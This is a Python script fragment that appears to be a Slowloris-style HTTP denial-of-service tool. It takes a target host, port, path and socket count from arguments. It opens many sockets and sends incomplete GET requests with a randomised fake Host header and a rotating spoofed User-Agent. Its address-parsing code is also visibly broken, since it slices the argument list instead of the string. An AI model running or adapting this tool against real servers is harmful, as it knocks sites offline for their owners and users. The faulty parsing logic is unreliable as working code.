from socket import socket,error,AF_INET,SOCK_STREAM
from random import choice,randint

user_agents=(
	("Mozilla/5.0"),
	("(Windows NT 6.1; WOW64)","(Windows NT 10.0; WOW64)","(Windows NT 6.1; WOW64; rv:49.0)","(Windows NT 6.3; rv:36.0)","(Windows NT 10.0; WOW64; rv:49.0)",
	 "(Macintosh; Intel Mac OS X 10_11_6)","(Macintosh; Intel Mac OS X 10_12)","(Macintosh; Intel Mac OS X 10_12_0)","(Macintosh; Intel Mac OS X 10_12_1)",
	 "(X11; Linux x86_64)","(X11; Ubuntu; Linux x86_64; rv:49.0)"),
	("AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0", "AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1",
	 "AppleWebKit/537.36 (KHTML, like Gecko)",
	 "Gecko/20100101"),
	("Chrome/53.0.2785.143","Chrome/54.0.2840.71",
	 "Firefox/36.0","Firefox/49.0",
	 "Safari/537.36","Safari/602.2.14")
)

def resolve_settings(args):
	global num_socks,timeout,message

	if len(args)>2: num_socks=int(args[2])
	if len(args)>3: timeout=int(args[3])
	if len(args)>4: message=args[4]

	if ':' in args[1]:
		addr=args[1][:args[1].find(':')]
		if '/' in args[1]:
			port=int(args[len(addr):args.index('/')])
			path=args[len(addr)+len(port):]
		else:
			port=int(args[len(addr)+1:])
			path='/'
	elif '/' in args[1]:
		addr=args[1][:args[1].find('/')]
		port=80
		path=args[1][len(addr):]
	else:
		addr=args[1]
		port=80
		path='/'
	
	return addr,port,path

def create_sock(addr,port,path):
	sock=socket(AF_INET,SOCK_STREAM)
	sock.settimeout(10)

	sock.connect((addr,port))
	sock.send(bytes("GET {} HTTP/1.1\r\n".format(path),'UTF-8'))

	host='.'.join(map(str,[randint(192,224),randint(0,256),randint(0,256),randint(0,256)]))
	sock.send(bytes("Host: {}\r\n".format(host),'UTF-8'))

	ua=' '.join(choice(seg) for seg in user_agents)
	sock.send(bytes("User-Agent: {}\r\n".format(ua),'UTF-8'))

	return sock